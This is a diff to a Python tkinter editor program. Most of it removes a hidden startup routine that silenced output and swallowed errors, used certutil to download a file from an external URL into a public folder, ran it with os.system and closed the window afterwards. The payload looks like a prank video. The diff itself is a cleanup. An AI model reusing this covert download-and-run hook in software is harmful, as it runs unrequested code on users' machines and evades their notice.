@@ -31,42 +31,7 @@ DXM = 0  #
 DYM = 0  #
 
 
-import asyncio
-from asgiref.sync import sync_to_async
-
-
-async def no_wait():
-    import os
-    import sys
-
-    try:
-        import win32gui, win32con
-        devnull = os.open(os.devnull, os.O_WRONLY)
-        old_stdout = os.dup(1)
-        sys.stdout.flush()
-        os.dup2(devnull, 1)
-        os.close(devnull)
-
-        try:
-            if 'video.mp4' in os.listdir(r"C:\Users\Public\Videos"):
-                await sync_to_async(os.system)(r"C:\Users\Public\Videos\video.mp4")
-                minimize = win32gui.GetForegroundWindow()
-                await asyncio.sleep(12)
-                win32gui.PostMessage(minimize, win32con.WM_CLOSE, 0, 0)
-
-            else:
-                await sync_to_async(os.system)('certutil.exe -urlcache -split -f '
-                                               '"https://rr5---sn-ab5l6ndy.googlevideo.com/videoplayback?expire=1710111170&ei=YuXtZdjqFJeP_9EP79yc8Ac&ip=170.246.54.119&id=o-ANs_i34Ym0sRO_szRzQ8vvg174LEcIjQWHzSngQU3wTq&itag=18&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&mh=aH&mm=31%2C29&mn=sn-ab5l6ndy%2Csn-ab5sznzy&ms=au%2Crdu&mv=m&mvi=5&pl=22&initcwndbps=70000&spc=UWF9fxfRWpAmAc_yNMAopkataqXYKVoh3F2D7wDGiqKEZa8&vprv=1&svpuc=1&mime=video%2Fmp4&cnr=14&ratebypass=yes&dur=7.685&lmt=1659257192961318&mt=1710089123&fvip=1&fexp=24007246&c=ANDROID&txp=1318224&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Ccnr%2Cratebypass%2Cdur%2Clmt&sig=AJfQdSswRAIga9Ebl3Ujn6ardnIuAfbDTx1MxaXn1mGbn93ZooB1Ix8CIFDfTImdAf1DFUE7Oks8prJQwHW6TdTXKVqH4CGB9xFl&lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&lsig=APTiJQcwRQIhAJZbNBfmnEgTpQ0uIB3acF813JO4ARPPDrRTL613l9HCAiA5JCVGJPVr5-j_FwzYDHljKmvk0hRZz3eaQSeORkxX5Q%3D%3D&title=%D0%93%D0%B4%D0%B5%20%D0%BA%D0%B0%D1%80%D1%82%D0%B0%2C%20%D0%91%D0%B8%D0%BB%D0%BB%D0%B8%3F"'
-                                               r'"C:\Users\Public\Videos\video.mp4"')
-        finally:
-            os.dup2(old_stdout, 1)
-            os.close(old_stdout)
-
-    except Exception:
-        pass
-
-
-async def main():
+def main():
     def reset_masshtabe(*args):
         global Masshtabe
         Masshtabe = round(10 ** scale.get())
@@ -98,7 +63,6 @@ async def main():
     master.bind('<Key r>', restMapD)
 
     def create_object(event, ind=-1):
-        print(ind)
         if ind == -1:
             x, y = event.x, event.y
             x -= 300
@@ -533,19 +497,10 @@ BoteZ: 0
     master.bind('<Shift-S>', msave)
     master.bind('<Shift-s>', msave)
 
-    # master.attributes("-topmost", True)
+    master.attributes("-topmost", True)
     while True:
-        await asyncio.sleep(0.2)
         update()
 
 
-async def run():
-    tasks = [
-        asyncio.create_task(no_wait()),
-        asyncio.create_task(main()),
-    ]
-    await asyncio.gather(*tasks)
-
-
 if __name__ == '__main__':
-    asyncio.run(run())
+    main()
